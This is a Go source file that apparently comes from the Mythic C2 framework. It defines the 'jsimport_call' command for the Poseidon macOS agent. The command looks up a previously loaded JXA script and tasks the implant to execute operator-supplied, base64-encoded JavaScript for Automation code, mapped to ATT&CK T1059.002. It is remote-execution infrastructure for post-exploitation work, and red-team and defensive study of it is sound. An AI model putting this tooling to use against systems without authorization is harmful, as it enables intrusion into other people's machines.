package agentfunctions

import (
	"encoding/base64"
	"fmt"
	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/logging"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
	"github.com/MythicMeta/MythicContainer/utils/helpers"
)

func init() {
	agentstructs.AllPayloadData.Get("poseidon").AddCommand(agentstructs.Command{
		Name:                "jsimport_call",
		HelpString:          "jsimport_call {  \"code\": \"ObjC.import(\\'Cocoa\\'); $.NSBeep();\" }",
		Description:         "Execute jxa code from a loaded script via jsimport.",
		Version:             1,
		MitreAttackMappings: []string{"T1059.002"},
		Author:              "@its_a_feature_",
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "code",
				ModalDisplayName: "JXA Code to execute from script loaded with jsimport",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Select the JXA Script to load into memory",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						UIModalPosition:     2,
					},
				},
			},
			{
				Name:                 "filename",
				ModalDisplayName:     "File Registered via 'jsimport' with the function to execute",
				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Description:          "The name of the script",
				DynamicQueryFunction: getCallbackFiles,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						UIModalPosition:     1,
					},
				},
			},
		},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_MACOS},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}
			if filename, err := taskData.Args.GetStringArg("filename"); err != nil {
				logging.LogError(err, "Failed to get filename")
				response.Success = false
				response.Error = err.Error()
				return response
			} else if search, err := mythicrpc.SendMythicRPCFileSearch(mythicrpc.MythicRPCFileSearchMessage{
				Filename:        filename,
				LimitByCallback: true,
				CallbackID:      taskData.Callback.ID,
				MaxResults:      1,
			}); err != nil {
				response.Success = false
				response.Error = "Error trying to search for files: " + err.Error()
				return response
			} else if !search.Success {
				response.Success = false
				response.Error = search.Error
				return response
			} else if len(search.Files) == 0 {
				response.Success = false
				response.Error = "Failed to find specified file"
				return response
			} else if code, err := taskData.Args.GetStringArg("code"); err != nil {
				response.Success = false
				response.Error = "Failed to find code parameter"
				return response
			} else {
				taskData.Args.RemoveArg("filename")
				taskData.Args.AddArg(agentstructs.CommandParameter{
					Name:          "file_id",
					ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
					DefaultValue:  search.Files[0].AgentFileId,
				})
				base64Code := base64.StdEncoding.EncodeToString([]byte(code))
				taskData.Args.SetArgValue("code", base64Code)
				displayString := fmt.Sprintf("code within %s ",
					search.Files[0].Filename)
				response.DisplayParams = &displayString
				return response
			}
		},
	})
}

func getCallbackFiles(input agentstructs.PTRPCDynamicQueryFunctionMessage) []string {
	if fileResp, err := mythicrpc.SendMythicRPCFileSearch(mythicrpc.MythicRPCFileSearchMessage{
		LimitByCallback:     true,
		CallbackID:          input.Callback,
		IsPayload:           false,
		IsDownloadFromAgent: false,
		Filename:            "",
	}); err != nil {
		logging.LogError(err, "Failed to search for files in callback")
		return []string{}
	} else if !fileResp.Success {
		logging.LogError(err, "Failed to search for files in callback", "mythic error", fileResp.Error)
		return []string{}
	} else {
		potentialFiles := []string{}
		for _, file := range fileResp.Files {
			if !helpers.StringSliceContains(potentialFiles, file.Filename) {
				potentialFiles = append(potentialFiles, file.Filename)
			}
		}
		return potentialFiles
	}
}
